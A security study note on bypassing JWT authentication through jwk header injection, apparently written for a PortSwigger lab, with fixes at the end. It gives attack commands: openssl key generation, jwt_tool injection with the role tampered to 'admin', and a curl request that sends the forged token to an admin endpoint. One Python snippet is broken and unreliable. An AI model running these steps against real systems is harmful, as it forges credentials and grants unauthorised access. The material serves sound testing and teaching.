---
tags: [vapt, jwt, intermediate]
difficulty: intermediate
module: "18 - JWT"
topic: "18.07 JWT Header Injection — jwk claim"
portswigger_labs: ["JWT authentication bypass via jwk header injection"]
---

# 18.07 — JWT Header Injection: jwk Claim

## What Is the jwk Header?

```
JWK (JSON Web Key):
  A JSON object containing a cryptographic key
  
  JWT HEADER CAN EMBED A JWK:
  {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {
      "kty": "RSA",
      "n": "PUBLIC_KEY_MODULUS...",
      "e": "AQAB"
    }
  }
  
  PURPOSE: Include the verification key IN the token itself
  (For cases where receiver doesn't know which key to use)
  
THE ATTACK:
  Attacker generates their OWN RSA key pair
  Embeds their PUBLIC key in the jwk header
  Signs the token with their PRIVATE key
  
  Vulnerable server: "The token tells me to use this key (jwk)"
  → Takes attacker's key from jwk
  → Verifies with attacker's key
  → Attacker signed with matching private key → VALID!
  
  IMPACT: Attacker can forge any JWT payload!
```

---

## Attack Steps

```
STEP 1: Generate your own RSA key pair:
  openssl genrsa -out attacker_private.pem 2048
  openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

STEP 2: Convert public key to JWK format:
  python3 -c "
  from cryptography.hazmat.primitives.serialization import load_pem_private_key
  from cryptography.hazmat.backends import default_backend
  import base64, json
  
  with open('attacker_private.pem', 'rb') as f:
      private_key = load_pem_private_key(f.read(), None, default_backend())
  
  public_key = private_key.public_key()
  pub_numbers = public_key.public_key().key_size  # get RSA components
  # Use jwcrypto for proper JWK serialization
  "
  
  # EASIER: Use jwt_tool or python-jose:
  pip install python-jose
  python3 -c "
  from jose import jwk
  import json
  key = jwk.construct({'kty':'RSA','n':'...','e':'AQAB'})
  "

STEP 3: Craft malicious JWT with embedded jwk:
  python3 jwt_tool.py TOKEN -X i
  # -X i = inject jwk (auto-generates key pair, embeds public key, signs with private)
  
  jwt_tool handles the key generation and embedding automatically!

STEP 4: Tamper the payload:
  python3 jwt_tool.py TOKEN -X i -T
  # -T = tamper mode (change role, userId, etc.)

STEP 5: Send the forged JWT:
  curl https://target.com/admin \
    -H "Authorization: Bearer FORGED_JWT"
  → If server uses jwk from header → accepts attacker's key → access!
```

---

## What jwk_tool Does Automatically

```bash
# jwt_tool -X i:
# 1. Generates new RSA key pair (ephemeral)
# 2. Constructs new JWT header with embedded jwk (attacker's public key)
# 3. Keeps original payload (or lets you tamper)
# 4. Signs with attacker's private key
# 5. Returns complete forged JWT

# OUTPUT:
# [+] Injected jwk:
# [+] New JWT:
# eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOi...

# THEN TAMPER:
# python3 jwt_tool.py TOKEN -X i -T -c '{"role":"admin"}'
```

---

## Detection and Testing

```bash
# STEP 1: Decode the JWT header:
JWT_HEADER=$(echo "YOUR_TOKEN" | cut -d. -f1)
echo "$JWT_HEADER==" | base64 -d 2>/dev/null

# STEP 2: Check if server already uses jwk in legitimate tokens:
# If legitimate tokens have jwk header → server may be configured to trust it!

# STEP 3: Test injection:
python3 jwt_tool.py TOKEN -X i
# If response changes from 401 to 200 → VULNERABLE!

# ALSO CHECK: jku and x5u headers (similar attack, remote key fetch)
```

---

## Fix

```
DEFENSES:
  ✓ NEVER trust the jwk header from the JWT itself!
    Keys used for verification must come from a trusted internal source.
    
  ✓ Hardcode the verification key in server configuration:
    # Python (PyJWT):
    PUBLIC_KEY = open('trusted_public.pem').read()  # loaded at startup!
    
    payload = jwt.decode(
        token,
        PUBLIC_KEY,
        algorithms=['RS256']
        # Key is from OUR config, not from the JWT header!
    )
    
  ✓ Validate that the jwk embedded in JWT matches a known trusted key:
    Acceptable approach: Compare embedded key fingerprint against allowlist
    
  ✓ Use JWKS endpoint approach: server fetches key by kid from trusted endpoint
    But: jku (URL to JWKS) must also be validated! (See note 18.08)
```

---

## Related Notes
- [[08 - JWT Header Injection jku claim]] — remote JWKS URL injection
- [[05 - RS256 to HS256 Algorithm Confusion]] — related key confusion
- [[18 - Defense Strong Algorithms Validation Short Expiry]] — fix
